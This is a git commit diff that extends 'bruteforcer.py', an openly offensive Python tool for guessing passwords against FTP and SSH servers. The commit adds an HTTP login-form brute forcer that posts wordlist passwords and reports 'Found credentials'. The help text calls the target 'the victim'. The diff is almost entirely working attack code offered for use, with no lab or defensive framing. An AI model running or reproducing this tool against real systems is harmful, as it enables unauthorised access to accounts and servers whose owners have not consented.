77ef6a266c24e5a94dee1352262842593f0bb760
RohiRIK <108658615+RohiRIK@users.noreply.github.com>
2022-08-07 20:11:08 +0300

    Update bruteforcer.py

--- bruteforcer.py
+++ bruteforcer.py
@@ -5,15 +5,24 @@ import paramiko
 import socket
 import time
 import argparse
+import requests
+import progressbar
 from progress.spinner import MoonSpinner
 
+
+####################### Loding fun #######################
+
+def loding():
+    with MoonSpinner('Processing…') as bar:
+        for i in range(100):
+            time.sleep(0.02)
+            bar.next()
 
 
 ####################### FTP BRURUTEFORCER #######################
 
 def process_ftp(host,username,password):
     try:
-
         connect = ftplib.FTP()
         print(f"{Fore.MAGENTA}[!] host: {host}   login:{username}    password: {password}", Fore.RESET)
         connect.connect(host, 21, timeout=5)
@@ -33,10 +42,7 @@ def Burtrforce_ftp(host,username,path):
             if process_ftp(host,username,password):
                 break
 
-
-
-
-###################### SSH BRURUTEFORCER #######################
+# ###################### SSH BRURUTEFORCER #######################
 
 def process_ssh(host,username,password):
 
@@ -67,11 +73,32 @@ def Burtrforce_ssh(host,username,path):
                 break
 
 
+# ###################### HTTP BRURUTEFORCER #######################
+
+def process_http(url,var_name,username,var_pass,password,text_site):
+    data_payload = {
+            var_name:username,
+            var_pass:password,
+                                }
+    site = requests.post(url, data=data_payload)
+    text = site.text
+    if text_site in text:
+            print(f"{Fore.MAGENTA}[!] connect: {url}   login: {username}    password: {password}", Fore.RESET)
+            return False
+    else:
+        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}", Fore.RESET)
+        return True
 
 
+def Burtrforce_http(url,var_name,username,var_pass,path,text_site):
+    passwords = Path(path)
+    with open(passwords, errors="ignore") as passlist:
+        for password in passlist:
+            password = ''.join(password.split("\n"))
+            if process_http(url,var_name,username,var_pass,password,text_site):
+                break
 
-
-#######################  MAIN FUN #######################
+######################  MAIN FUN #######################
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Ultimate Burtrforcer")
@@ -79,17 +106,30 @@ if __name__ == "__main__":
     parser.add_argument("-IP","--host", help="Hostname or IP Address of the victim to bruteforce.")
     parser.add_argument("-P", "--wordlist", help="Wordlist that contain password list in each line.")
     parser.add_argument("-U", "--user", help="Username to connect.")
+    parser.add_argument("-url","--url", help="URL for the site that you wont to bruteforce")
+    parser.add_argument("-l", "--login", help="The name of the variable for user in the site")
+    parser.add_argument("-pas", "--var_pass", help="The name of the variable for password in the site")
+    parser.add_argument("-txt","--text_site", help="Login failed text")
 
     args = parser.parse_args()
     service = args.service
     host = args.host
     path = args.wordlist
     username = args.user
+    url = args.url
+    login = args.login
+    var_pass = args.var_pass
+    text_site = args.text_site
     if service == "ftp":
+        loding()
         Burtrforce_ftp(host,username,path)
     if service == "ssh":
-      Burtrforce_ssh(host,username,path)
-    if service != "ssh" or "ftp":
-        print("[-h] [-S SERVICE] [-IP HOST] [-P WORDLIST] [-U USER]")
+        loding()
+        Burtrforce_ssh(host,username,path)
+    if service == "http":
+        loding()
+        Burtrforce_http(url, login, username, var_pass, path, text_site)
+    else:
+        print("[-h] [-S SERVICE] [-IP HOST] [-P WORDLIST] [-U USER] [-url URL] [-us--var_name US__VAR_NAME][-pas VAR_PASSWORD] [-txt TEXT_SITE]")
 
 
